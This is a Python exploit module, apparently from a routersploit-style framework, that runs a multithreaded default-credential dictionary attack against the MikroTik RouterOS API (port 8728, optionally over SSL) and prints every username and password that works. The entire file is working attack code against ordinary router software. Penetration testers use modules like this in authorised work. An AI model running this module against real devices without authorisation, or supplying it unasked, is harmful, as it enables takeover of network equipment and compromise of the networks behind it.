import socket
import ssl

from routerxpl.core.exploit import *
from routerxpl.core.tcp.tcp_client import TCPClient
from routerxpl.libs.apiros.apiros_client import ApiRosClient, LoginError
from routerxpl.resources import wordlists


class Exploit(TCPClient):
    __info__ = {
        "name": "Mikrotik Default Creds - API ROS",
        "description": "Module performs dictionary attack against Mikrotik API and API-SSL. "
                       "If valid credentials are found they are displayed to the user.",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
        "devices": (
            "Mikrotik Router",
        )
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(8728, "Target API port")

    ssl = OptBool(False, "Use SSL for API")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist(
        wordlists.mikrotik_api,
        "User:Pass or file with default credentials (file://)",
    )
    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        if not self.check():
            return

        print_status("Starting default creds attack")

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def login(self, username, password):
        apiros = None
        try:
            apiros = ApiRosClient(
                address=self.target,
                port=self.port,
                user=username,
                password=password,
                use_ssl=self.ssl
            )
            apiros.open_socket()

            output = apiros.login()

            if output[0][0] == "!done":
                print_success("Authentication Succeed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)
                self.credentials.append((self.target, self.port, self.target_protocol, username, password))
                return True
            else:
                print_error("Unexpected Response - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)

        except LoginError:
            print_error("Authentication Failed - Username: '{}' Password: '{}'".format(username, password), verbose=self.verbosity)
        except ssl.SSLError:
            print_error("SSL Error, retrying...")
            return self.login(username, password)
        finally:
            if apiros is not None:
                apiros.close()
        return False

    def target_function(self, running, creds):
        while running.is_set():
            username = ""
            passsword = ""
            try:
                username, password = creds.next().split(":", 1)
                if self.login(username, password) and self.stop_on_success:
                    running.clear()
            except RuntimeError:
                print_error("Connection closed by remote end")
                break

            except socket.timeout:
                print_error("Timeout waiting for the response")
                break

            except StopIteration:
                break

    def check(self):
        tcp_client = self.tcp_create()
        if tcp_client.connect():
            tcp_client.close()
            return True

        return False

    def check_default(self):
        self.credentials = []

        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            return self.credentials